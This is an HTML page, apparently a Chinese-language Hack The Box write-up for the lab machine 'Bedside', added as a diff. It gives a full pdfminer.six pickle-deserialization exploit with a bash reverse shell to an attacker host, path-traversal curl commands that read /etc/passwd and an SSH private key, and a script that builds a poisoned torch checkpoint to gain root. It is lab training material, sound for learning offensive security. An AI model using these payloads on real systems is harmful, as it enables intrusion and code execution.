@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Bedside — 完整攻略</title>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&family=Noto+Sans+SC:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--red:#f87171;--amber:#fbbf24;--blue:#60a5fa;--purple:#c084fc;--cyan:#22d3ee;--code-bg:#0a0c10}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Noto Sans SC','Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.8;-webkit-font-smoothing:antialiased}.hero{border-bottom:1px solid var(--border);padding:4rem 2rem 3rem;position:relative}.hero::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--blue),var(--red))}.hero-inner{max-width:860px;margin:0 auto}.hero-label{font-family:'IBM Plex Mono',monospace;font-size:.75rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1rem}.hero h1{font-size:2.8rem;font-weight:700;color:var(--heading);letter-spacing:-.03em}.hero h1 span{color:var(--accent)}.hero-meta{margin-top:1.2rem;display:flex;gap:2rem;flex-wrap:wrap;font-family:'IBM Plex Mono',monospace;font-size:.8rem;color:var(--text-muted)}.hero-meta strong{color:var(--text)}.chain{background:var(--surface);border-bottom:1px solid var(--border);padding:1.5rem 2rem;overflow-x:auto}.chain-inner{max-width:860px;margin:0 auto;display:flex;align-items:center;gap:0;white-space:nowrap;font-family:'IBM Plex Mono',monospace;font-size:.78rem}.chain-node{padding:.4rem .9rem;border-radius:4px;font-weight:500}.chain-node.green{background:var(--accent-dim);color:var(--accent)}.chain-node.blue{background:#1e3a5f;color:var(--blue)}.chain-node.red{background:#5f1e1e;color:var(--red)}.chain-arrow{color:var(--text-muted);padding:0 .5rem}.content{max-width:860px;margin:0 auto;padding:3rem 2rem 6rem}.phase{margin-top:3.5rem;margin-bottom:2rem;padding-bottom:.8rem;border-bottom:1px solid var(--border)}.phase:first-child{margin-top:0}.phase-number{font-family:'IBM Plex Mono',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.3rem}.phase-number.green{color:var(--accent)}.phase-number.blue{color:var(--blue)}.phase-number.red{color:var(--red)}.phase h2{font-size:1.6rem;font-weight:700;color:var(--heading)}h3{font-size:1.15rem;font-weight:600;color:var(--heading);margin-top:2.2rem;margin-bottom:.8rem}p{margin-bottom:1rem}pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;margin:1rem 0 1.4rem;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:1.65;color:var(--text)}pre .comment{color:var(--text-muted)}pre .cmd{color:var(--accent)}pre .output{color:#8b949e}pre .highlight{color:var(--amber)}pre .important{color:var(--red)}code{font-family:'IBM Plex Mono',monospace;font-size:.88em;background:var(--surface-raised);padding:.15em .4em;border-radius:3px;color:var(--cyan)}pre code{background:none;padding:0;color:inherit}.callout{border-radius:6px;padding:1rem 1.2rem;margin:1.2rem 0;font-size:.92rem;line-height:1.6}.callout-why{background:#1a1e26;border-left:3px solid var(--blue)}.callout-why .callout-label{color:var(--blue)}.callout-key{background:#1a1220;border-left:3px solid var(--purple)}.callout-key .callout-label{color:var(--purple)}.callout-warn{background:#1e1a12;border-left:3px solid var(--amber)}.callout-warn .callout-label{color:var(--amber)}.callout-label{font-family:'IBM Plex Mono',monospace;font-size:.72rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;display:block;margin-bottom:.3rem}.takeaway{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.5rem;margin:2rem 0}.takeaway h3{margin-top:0}.takeaway-item{padding:.5rem 0;border-bottom:1px solid var(--border)}.takeaway-item:last-child{border-bottom:none}.takeaway-item strong{color:var(--heading)}.takeaway-item p{margin-bottom:0}.diagram{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:2rem;margin:1.5rem 0;text-align:center;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:2;color:var(--text);overflow-x:auto}.diagram .node{display:inline-block;padding:.3rem .8rem;border-radius:4px}.diagram .node-green{background:var(--accent-dim);color:var(--accent)}.diagram .node-blue{background:#1e3a5f;color:var(--blue)}.diagram .node-red{background:#5f1e1e;color:var(--red)}.diagram .arrow{color:var(--text-muted);margin:0 .3rem}.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:.75rem;color:var(--text-muted);border-top:1px solid var(--border);margin-top:4rem}@media(max-width:640px){.hero h1{font-size:1.8rem}.content{padding:2rem 1rem 4rem}pre{font-size:.75rem;padding:1rem}}</style>
+</head>
+<body>
+<div id="gate" style="position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;"><div style="text-align:center;font-family:'IBM Plex Mono',monospace;"><div style="font-size:2.4rem;margin-bottom:.3rem;">🏥</div><div style="font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1.2rem;">HTB Writeup — Restricted</div><div style="color:var(--text-muted);font-size:.85rem;margin-bottom:1.5rem;max-width:320px;line-height:1.6;">This writeup contains spoilers for an HTB machine.<br>Enter the password to continue.</div><input id="gate-pw" type="password" placeholder="Password" autofocus style="background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:.6rem 1rem;border-radius:4px;font-family:inherit;font-size:.9rem;width:220px;text-align:center;outline:none;" onkeydown="if(event.key==='Enter')checkPw()"><br><button onclick="checkPw()" style="margin-top:.8rem;background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent);padding:.5rem 1.8rem;border-radius:4px;font-family:inherit;font-size:.82rem;cursor:pointer;">Enter</button><div id="gate-err" style="color:var(--red);font-size:.78rem;margin-top:.8rem;visibility:hidden;">Incorrect password</div><div style="color:var(--text-muted);font-size:.7rem;margin-top:2rem;opacity:.4;font-style:italic;direction:rtl;unicode-bidi:bidi-override;">Tessera est nomen machinae</div></div></div>
+<script>function checkPw(){if(document.getElementById('gate-pw').value==='bedside'){document.getElementById('gate').style.display='none';sessionStorage.setItem('htb-auth-bs','1')}else{document.getElementById('gate-err').style.visibility='visible';document.getElementById('gate-pw').value=''}};if(sessionStorage.getItem('htb-auth-bs')==='1')document.getElementById('gate').style.display='none';</script>
+
+<header class="hero"><div class="hero-inner"><div class="hero-label">Hack The Box — 完整攻略</div><h1><span>Bedside</span></h1><div class="hero-meta"><span>OS <strong>Linux (Debian + Docker)</strong></span><span>难度 <strong>Medium</strong></span><span>端口 <strong>22 · 80 · 3000(filtered)</strong></span><span>作者 <strong><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a></strong></span></div></div></header>
+
+<div class="chain"><div class="chain-inner"><span class="chain-node green">pdfminer pickle 反序列化 → 容器 shell</span><span class="chain-arrow">→</span><span class="chain-node blue">Docker 内网 → 3000 端口穿越 → SSH developer</span><span class="chain-arrow">→</span><span class="chain-node red">torch.load checkpoint 投毒 → root</span></div></div>
+
+<main class="content">
+
+<p style="color:var(--text-muted);font-style:italic;margin-bottom:2rem;">🧒 一句话版：邮寄两个包裹骗服务器弹 shell → 从容器窗户看到走廊门没锁 → 往冰箱里放有毒半成品让厨师中招</p>
+
+<div class="phase"><div class="phase-number green">Phase 0</div><h2>信息收集</h2></div>
+
+<h3>Nmap</h3>
+<pre><code><span class="cmd">$ sudo nmap -sCV -p- -T4 10.129.248.191</span>
+<span class="output">PORT     STATE    SERVICE VERSION
+22/tcp   open     ssh     OpenSSH 10.0p2 Debian
+80/tcp   open     http    Apache httpd 2.4.68 (Debian)
+<span class="highlight">3000/tcp filtered ppp</span>    ← 外部不可达，内部可达</span></code></pre>
+
+<h3>子域名发现</h3>
+<pre><code><span class="cmd">$ gobuster vhost -u http://bedside.htb \
+  -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
+  --append-domain -r</span>
+<span class="output">Found: <span class="highlight">research.bedside.htb</span></span>
+
+<span class="cmd">$ whatweb http://research.bedside.htb/</span>
+<span class="output">X-Powered-By[<span class="highlight">pdfminer.six</span>]</span></code></pre>
+
+<p><code>research.bedside.htb</code> 是一个医学影像上传门户，后端使用 <code>pdfminer.six</code> 解析 PDF——这个库有已知的反序列化漏洞。</p>
+
+
+<div class="phase"><div class="phase-number green">Phase 1</div><h2>立足点 — pdfminer.six Pickle 反序列化 RCE</h2></div>
+
+<div class="callout callout-key">
+<span class="callout-label">🧒 两个包裹攻击</span>
+pdfminer.six 解析 PDF 时会读取 <code>/Encoding</code> 字段指向的文件。如果该文件是 pickle 格式，就会触发反序列化执行。攻击分两步：先上传恶意 pickle（伪装成 .gz 归档），再上传一个 PDF，PDF 里的 <code>/Encoding</code> 指向刚上传的 pickle 文件——第一个包裹是炸弹，第二个是引信。
+</div>
+
+<h3>完整 Exploit</h3>
+<pre><code>#!/usr/bin/env python3
+# exploit_2file.py — pdfminer.six pickle deserialization
+# 用法: python3 exploit_2file.py &lt;LHOST&gt; &lt;LPORT&gt;
+
+import gzip, pickle, os, sys, requests
+
+LHOST, LPORT = sys.argv[1], sys.argv[2]
+UP  = "/var/www/research.bedside.htb/uploads"
+URL = "http://research.bedside.htb/"
+
+class RCE:
+    def __reduce__(self):
+        cmd = f"setsid bash -c 'bash -i &gt;&amp; /dev/tcp/{LHOST}/{LPORT} 0&gt;&amp;1' &amp;"
+        return (os.system, (cmd,))
+
+# /Encoding 字段的路径（/ 编码为 #2F）
+enc = (UP + "/sh").replace("/", "#2F")
+
+PDF = f"""%PDF-1.4
+1 0 obj&lt;&lt; /Type /Catalog /Pages 2 0 R &gt;&gt;endobj
+2 0 obj&lt;&lt; /Type /Pages /Kids [3 0 R] /Count 1 &gt;&gt;endobj
+3 0 obj&lt;&lt; /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]
+/Contents 4 0 R /Resources &lt;&lt; /Font &lt;&lt; /F1 5 0 R &gt;&gt; &gt;&gt; &gt;&gt;endobj
+4 0 obj&lt;&lt; /Length 20 &gt;&gt;stream
+BT /F1 12 Tf ET
+endstream endobj
+5 0 obj&lt;&lt; /Type /Font /Subtype /Type0 /BaseFont /F
+/Encoding /{enc} /DescendantFonts [6 0 R] &gt;&gt;endobj
+6 0 obj&lt;&lt; /Type /Font /Subtype /CIDFontType2 /BaseFont /F
+/CIDSystemInfo &lt;&lt; /Registry (Adobe) /Ordering (Identity) /Supplement 0 &gt;&gt;
+/FontDescriptor 7 0 R &gt;&gt;endobj
+7 0 obj&lt;&lt; /Type /FontDescriptor /FontName /F /Flags 4
+/FontBBox [-1000 -1000 1000 1000] /ItalicAngle 0 /Ascent 1000
+/Descent -200 /CapHeight 800 /StemV 80 &gt;&gt;endobj
+trailer&lt;&lt; /Size 8 /Root 1 0 R &gt;&gt;
+%%EOF
+"""
+
+# 1. 上传恶意 pickle.gz
+payload = gzip.compress(pickle.dumps(RCE()))
+r1 = requests.post(URL, files={
+    "uploadFile": ("sh.pickle.gz", payload, "application/gzip")
+})
+print("[1] uploaded sh.pickle.gz")
+
+# 2. 上传触发 PDF
+r2 = requests.post(URL, files={
+    "uploadFile": ("trigger.pdf", PDF.encode(), "application/pdf")
+})
+print("[2] uploaded trigger.pdf — 等待 cron ≈ 30 秒")</code></pre>
+
+<pre><code><span class="cmd">$ nc -lvnp 4444</span>
+<span class="output">datawrangler@data-wrangler:~$</span>  <span class="comment">← Docker 容器内</span></code></pre>
+
+
+<div class="phase"><div class="phase-number blue">Phase 2</div><h2>容器逃逸 — Docker 内网 → 路径穿越 → SSH</h2></div>
+
+<div class="callout callout-why">
+<span class="callout-label">🧒 从窗户看到走廊门没锁</span>
+我们困在 Docker 容器里，但可以访问 Docker 内网（172.17.0.1）。外部被防火墙封锁的 3000 端口（MRI 图像查看器），从容器内部是可达的——而且有路径穿越漏洞，可以读取宿主机的任意文件。
+</div>
+
+<h3>内网探测</h3>
+<pre><code><span class="cmd">datawrangler@data-wrangler:~$ python3 -c '
+import socket
+for p in [22, 80, 3000, 5000, 8000, 8080, 9000]:
+    s = socket.socket(); s.settimeout(0.6)
+    if s.connect_ex(("172.17.0.1", p)) == 0: print("OPEN", p)
+    s.close()
+'</span>
+<span class="output">OPEN 22
+OPEN 80
+<span class="highlight">OPEN 3000</span></span></code></pre>
+
+<h3>路径穿越读取 SSH 私钥</h3>
+<pre><code><span class="cmd">$ curl -s --path-as-is 'http://172.17.0.1:3000/../../../../etc/passwd'</span>
+<span class="output">developer:x:1000:1000:developer,,,:/home/developer:/bin/bash</span>
+
+<span class="cmd">$ curl -s --path-as-is 'http://172.17.0.1:3000/../../../../home/developer/.ssh/id_rsa'</span>
+<span class="output"><span class="highlight">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+...</span>
+-----END OPENSSH PRIVATE KEY-----</span></code></pre>
+
+<pre><code><span class="cmd">$ chmod 600 id_rsa
+$ ssh -i id_rsa developer@bedside.htb</span>
+
+<span class="cmd">developer@bedside:~$ cat user.txt</span>
+<span class="output">805a0da5fb7b0afa759c45d483625826</span></code></pre>
+
+
+<div class="phase"><div class="phase-number red">Phase 3</div><h2>权限提升 — torch.load Checkpoint 投毒</h2></div>
+
+<pre><code><span class="cmd">developer@bedside:~$ sudo -l</span>
+<span class="output">(ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/<span class="highlight">bedside_trainer.py</span></span></code></pre>
+
+<div class="callout callout-key">
+<span class="callout-label">🧒 往冰箱里放有毒半成品</span>
+训练脚本启动时会用 <code>torch.load</code> 加载 <code>/datastore/checkpoints/</code> 下的 checkpoint 文件继续训练。<code>torch.load</code> 底层使用 <code>pickle.load</code>——加载不可信文件等于任意代码执行。我们构造一个恶意 <code>.pt</code> 文件，让脚本以 root 权限执行我们的命令。
+</div>
+
+<div class="callout callout-warn">
+<span class="callout-label">多身份协作</span>
+developer 有 sudo 权限但不能写 <code>/datastore/</code>（属于 dataops 组）；datawrangler 可以写文件但没有 sudo。需要两个 shell 配合：datawrangler 放文件，developer 触发训练。
+</div>
+
+<h3>步骤一：生成恶意 .pt（攻击机上）</h3>
+<pre><code>#!/usr/bin/env python3
+# build_evil_pt.py
+
+import os, pickle, zipfile, argparse
+
+class RCE:
+    def __init__(self, cmd): self.cmd = cmd
+    def __reduce__(self): return (os.system, (self.cmd,))
+
+def build(cmd, out):
+    payload = pickle.dumps({"model": RCE(cmd)}, protocol=2)
+    with zipfile.ZipFile(out, "w", zipfile.ZIP_STORED) as z:
+        z.writestr("archive/data.pkl", payload)
+        z.writestr("archive/version", "3\n")
+    print(f"[+] wrote {out} ({os.path.getsize(out)} bytes)")
+
+if __name__ == "__main__":
+    p = argparse.ArgumentParser()
+    p.add_argument("-c", "--command", default="chmod +s /bin/bash")
+    p.add_argument("-o", "--output", default="checkpoint_epoch_99.pt")
+    build(p.parse_args().command, p.parse_args().output)</code></pre>
+
+<pre><code><span class="cmd">$ python3 build_evil_pt.py</span>
+<span class="output">[+] wrote checkpoint_epoch_99.pt</span></code></pre>
+
+<h3>步骤二：容器内放置文件（datawrangler）</h3>
+<pre><code><span class="cmd">datawrangler$ curl -s -o /tmp/evil.pt http://10.10.15.65:8000/checkpoint_epoch_99.pt
+datawrangler$ cp /tmp/evil.pt /datastore/checkpoints/checkpoint_epoch_99.pt</span></code></pre>
+
+<h3>步骤三：竞争清理循环（datawrangler，保持运行）</h3>
+<pre><code><span class="comment"># 后台 cron 会往 staging/ 写 .txt 干扰训练，需要持续清理</span>
+<span class="cmd">while true; do
+  rm -f /datastore/staging/*.txt /datastore/processed/*.txt 2>/dev/null
+  cp -n /tmp/scan.png /datastore/processed/scan.png 2>/dev/null
+  sleep 0.3
+done</span></code></pre>
+
+<h3>步骤四：触发训练（developer）</h3>
+<pre><code><span class="cmd">developer@bedside:~$ sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py</span>
+<span class="comment"># 即使报 TypeError，os.system 已经执行了</span>
+
+<span class="cmd">developer@bedside:~$ ls -la /bin/bash</span>
+<span class="output">-rws<span class="highlight">r-s</span>r-x 1 root root ...</span>
+
+<span class="cmd">developer@bedside:~$ /bin/bash -p</span>
+<span class="output">root@bedside:~# cat /root/root.txt
+4564bca13a6ecbb6e3cd869335506246</span></code></pre>
+
+
+<div class="phase"><div class="phase-number" style="color:var(--purple);">附录</div><h2>知识点总结</h2></div>
+
+<div class="takeaway">
+<div class="takeaway-item"><strong>pdfminer.six 的 /Encoding 字段可以触发 pickle 反序列化。</strong><p>PDF 解析器读取 /Encoding 指向的文件——如果是 pickle 格式就直接反序列化执行。双文件攻击：先上传 payload，再上传 trigger PDF。</p></div>
+<div class="takeaway-item"><strong>Docker 容器内可以访问宿主机的内部服务。</strong><p>外部 filtered 的端口从容器内网（172.17.0.1）可能是开放的。用 Python socket 扫端口是容器内无工具时的标准方法。</p></div>
+<div class="takeaway-item"><strong>torch.load = pickle.load = 任意代码执行。</strong><p>恶意 .pt 文件必须是 ZIP 格式（包含 archive/data.pkl + archive/version）。即使 torch.load 报错，payload 中的 os.system 已经执行了。</p></div>
+<div class="takeaway-item"><strong>多身份协作是中高难度机器的常见模式。</strong><p>一个身份有写权限，另一个有执行权限——两个 shell 各司其职，缺一不可。</p></div>
+<div class="takeaway-item"><strong>竞争条件需要循环脚本对抗。</strong><p>后台 cron 不断干扰环境状态？用 while true + sleep 持续维护条件，直到 exploit 触发。</p></div>
+</div>
+
+<div class="diagram"><span class="node node-green">pdfminer pickle</span><span class="arrow">→</span><span class="node node-green">容器 shell</span><span class="arrow">→</span><span class="node node-blue">Docker 内网</span><span class="arrow">→</span><span class="node node-blue">路径穿越 → SSH</span><span class="arrow">→</span><span class="node node-red">torch.load 投毒 → root</span></div>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB Bedside 攻略 · 2026</footer>
+</body></html>
